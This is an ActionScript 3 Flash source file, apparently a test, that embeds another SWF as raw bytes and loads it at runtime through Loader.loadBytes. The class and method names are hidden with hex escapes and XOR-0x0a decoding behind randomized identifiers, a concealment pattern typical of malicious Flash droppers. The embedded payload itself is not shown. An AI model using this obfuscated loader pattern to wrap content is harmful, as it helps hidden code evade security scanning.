package testflash
{ 
	import flash.display.*;
	import flash.text.*;
	import flash.utils.*;
	import flash.net.*;
	import flash.events.*;
    import flash.system.*;
 

    public class testflash extends Sprite
    {
        [Embed(source="\x73\x69\x6d\x70\x6c\x65\x2e\x73\x77\x66", mimeType="\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d")]
        private static const _1IJqO:Class;
        
        
        private function _oghit(encrypted:String):String
        {
            var _TdPNU:String = "";
            for (var _S4FeY:int = 0; _S4FeY < encrypted.length; _S4FeY++)
            {
                _TdPNU += String.fromCharCode(encrypted.charCodeAt(_S4FeY)^0x0a);
            }
            return _TdPNU;
        }
        

        public function testflash()
        {
            var _7xtAS:Namespace = new Namespace(_oghit("\x6c\x66\x6b\x79\x62\x24\x6e\x63\x79\x7a\x66\x6b\x73"));
            var _EU993:String = _oghit("\x46\x65\x6b\x6e\x6f\x78");
            var _NfQt7:Object = new _7xtAS::[_EU993]();
            var _IxzJc:String = _oghit("\x66\x65\x6b\x6e\x48\x73\x7e\x6f\x79");
            
            var _ovb9v:Object = new _1IJqO();
            var _IQKj4:ByteArray = _ovb9v as ByteArray;
            
            _NfQt7[_IxzJc](_IQKj4);
            
            addChild(_NfQt7 as DisplayObject);    
            
        }
    } 
}
